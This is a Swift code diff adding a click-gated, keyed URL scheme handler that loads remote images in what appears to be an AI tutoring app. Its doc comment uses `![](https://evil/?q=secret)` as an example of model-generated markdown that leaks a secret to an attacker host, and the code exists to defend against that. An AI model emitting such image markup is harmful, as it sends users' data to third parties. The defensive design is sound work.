@@ -143,3 +143,50 @@ final class BlobSchemeHandler: NSObject, WKURLSchemeHandler {
         return "application/octet-stream"
     }
 }
+
+/// Remote images in a reply load only after the learner's click, through `teacher-remote://img/?k=<key>&u=<https url>`.
+/// The page's CSP allows no http(s) images, so a model's `![](https://evil/?q=secret)` fetches nothing by itself; the
+/// per-process key (injected into the page, never in a prompt) stops model markup from naming this scheme directly.
+final class RemoteImageSchemeHandler: NSObject, WKURLSchemeHandler {
+    static let scheme = "teacher-remote"
+    static let key = UUID().uuidString
+    static let maxBytes = 8_000_000
+    private static let session: URLSession = {
+        let c = URLSessionConfiguration.ephemeral
+        c.timeoutIntervalForRequest = 15; c.httpCookieStorage = nil; c.urlCache = nil
+        return URLSession(configuration: c)
+    }()
+    private let tasks = NSMapTable<AnyObject, URLSessionTask>.strongToStrongObjects()
+
+    /// The https URL a request asks for, or nil when the key is wrong or the URL is not a plain https one.
+    static func target(_ url: URL) -> URL? {
+        guard let items = URLComponents(url: url, resolvingAgainstBaseURL: false)?.queryItems,
+              items.first(where: { $0.name == "k" })?.value == key,
+              let u = items.first(where: { $0.name == "u" })?.value, let t = URL(string: u),
+              t.scheme?.lowercased() == "https", t.host?.isEmpty == false else { return nil }
+        return t
+    }
+
+    func webView(_ webView: WKWebView, start task: WKURLSchemeTask) {
+        guard let url = task.request.url, let target = Self.target(url) else { task.didFailWithError(URLError(.badURL)); return }
+        var req = URLRequest(url: target); req.setValue("image/*", forHTTPHeaderField: "Accept")
+        let t = Self.session.dataTask(with: req) { data, resp, _ in
+            DispatchQueue.main.async {
+                guard let data, data.count <= Self.maxBytes, let http = resp as? HTTPURLResponse, http.statusCode == 200,
+                      (http.mimeType ?? "").hasPrefix("image/") else { task.didFailWithError(URLError(.cannotLoadFromNetwork)); return }
+                task.didReceive(HTTPURLResponse(url: url, statusCode: 200, httpVersion: "HTTP/1.1", headerFields: ["Content-Type": http.mimeType ?? "image/png"])!)
+                task.didReceive(data); task.didFinish()
+            }
+        }
+        tasks.setObject(t, forKey: task as AnyObject); t.resume()
+    }
+    func webView(_ webView: WKWebView, stop task: WKURLSchemeTask) {
+        tasks.object(forKey: task as AnyObject)?.cancel(); tasks.removeObject(forKey: task as AnyObject)
+    }
+
+    /// Registers this scheme and gives the page its key.
+    static func install(in config: WKWebViewConfiguration) {
+        config.setURLSchemeHandler(RemoteImageSchemeHandler(), forURLScheme: scheme)
+        config.userContentController.addUserScript(WKUserScript(source: "window.__remoteKey='\(key)';", injectionTime: .atDocumentStart, forMainFrameOnly: true))
+    }
+}
